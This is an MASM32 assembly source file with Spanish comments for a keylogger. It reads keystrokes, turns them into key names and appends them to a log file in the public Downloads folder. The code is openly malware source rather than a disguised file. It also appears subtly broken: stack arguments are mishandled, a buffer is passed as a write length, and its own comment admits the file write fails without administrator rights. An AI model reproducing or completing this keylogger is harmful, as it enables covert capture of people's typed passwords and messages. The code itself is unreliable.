.386
.MODEL flat, stdCALL
option casemap:none

; Includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
; librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
;Macros

;Constantes
MaxVector EQU 11
;Variables
.DATA
;ingreso db " Ingrese una letra: ",0,13
LogFileName db "C:\\Users\\Public\\Downloads\\keyslog.txt",0 ;Se debe de crear el archivo en la ruta
BytesWritten dw 0
BufferCadena db ('$')
Buffer dw 100 dup ('$')
ArrayTeclas dd  13,20,27,32,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75
                                dd  76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99
                                dd  100,101,102,103,104,105,186,187,188,189,190,191,192,219,220,121,122
.CODE
program:
	GuardarTeclas PROC 
		JMP		@inicio
	 @inicio:
		XOR		EDX,EDX
		XOR		ESI,ESI
		XOR		ECX,ECX
		MOV		EDI,58
		LEA		ESI,ArrayTeclas
		JMP		@getKey
     @getKey:
     	MOV		EDX,1
     	PUSH	[ESI]
     	CALL	crt__getch
     	ADD		ESI,4			;Se incrementa en 4
     	CMP		EAX,13			;Se compara si es un ENTER
     	JZ		@grabar
     	CMP		EAX,32			;Se compara si es un SPACE
		JZ		@grabar
		DEC		EDI
		JZ		@inicio
		JMP		@getKey
     
     @grabar:
     	PUSH	3
        PUSH	[ESI]
        CALL	MapVirtualKey      
        SHL		EAX,16        
        PUSH	100
        LEA		EBX, Buffer
        PUSH	EBX
        PUSH	EAX
        CALL	GetKeyNameText      
        PUSH	NULL
        PUSH	FILE_ATTRIBUTE_ARCHIVE
        PUSH	OPEN_ALWAYS
        PUSH	NULL
        PUSH	0
        PUSH	GENERIC_WRITE
        XOR		EAX,EAX
        LEA		EAX, LogFileName
        PUSH	EAX
        CALL	CreateFile
        CMP		EAX,0
        JE		@exit
        MOV		EBX,EAX    
        PUSH	FILE_END
        PUSH	NULL
        PUSH	NULL
        PUSH	EBX
        CALL	SetFilePointer                
        XOR		EDX, EDX
        LEA		EDX,Buffer
        PUSH	EDX
        CALL	lstrlen    
        PUSH	NULL
        XOR		EDX,EDX
        LEA		EDX, BytesWritten
        PUSH	EDX
        PUSH	Buffer
        LEA		EAX, Buffer
        PUSH	EAX
        PUSH	EBX
        CALL	WriteFile ;Aun generar error al escribir archivo, se debe de ejecutar como administrador
        PUSH	1
        CALL	Sleep   
        PUSH	EBX

	  @exit:
		invoke ExitProcess,0
	GuardarTeclas ENDP

	CALL	GuardarTeclas


end program